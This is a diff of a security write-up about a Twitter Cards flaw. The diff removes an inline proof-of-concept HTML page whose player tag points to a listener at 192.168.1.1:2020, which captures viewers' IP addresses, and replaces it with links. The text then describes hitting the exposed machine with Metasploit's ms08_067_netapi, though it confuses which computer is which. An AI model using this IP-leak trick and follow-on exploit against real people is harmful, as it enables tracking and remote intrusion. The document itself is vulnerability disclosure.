@@ -73,26 +73,8 @@ When the embedded video is played you might received the viewer(s) IP (I suggest
 
 ### PoC Video
 
-I made a video as a proof of concept, testing the vulnerability on a Virtual Machine running on WINXP SP2.(**Computer B**)
-The source code of tw.html page:
+I made a video as a proof of concept, testing the vulnerability on a Virtual Machine running on WINXP SP2 (**Computer B**).
+The source code can be found at [poc.html](./poc.html)
 
-```html
-
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>Twitter cards vulnerability</title>
-<meta name="twitter:card" content="player" />
-<meta name="twitter:title" content="Twitter cards vulnerability" />
-<meta name="twitter:description" content="Twitter cards vulnerability allows to get the video viewer IP, Listen to 192.168.1.1:2020 on your machine then play the video you will be surprised" />
-<meta name="twitter:player" content="https://192.168.1.1:2020" />
-<meta name="twitter:player:width" content="360" />
-<meta name="twitter:player:height" content="203" />
-<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/de/thumb/9/9f/Twitter_bird_logo_2012.svg/154px-Twitter_bird_logo_2012.svg.png" />
-</head>
-</html>
-```
 I've hosted the page on a server, shared it on twitter and then played the embedded video in the the Virtual Machine. Eventually I got **B's ip address.** by listening to in the port **2020**  coming from **Computer A** to then attack **Computer B** with metasploit's `ms08_067_netapi` exploit gaining access to **Computer A**.
-
-https://www.youtube.com/embed/0occxD9v11M
+You can find the video [here](https://www.youtube.com/embed/0occxD9v11M).
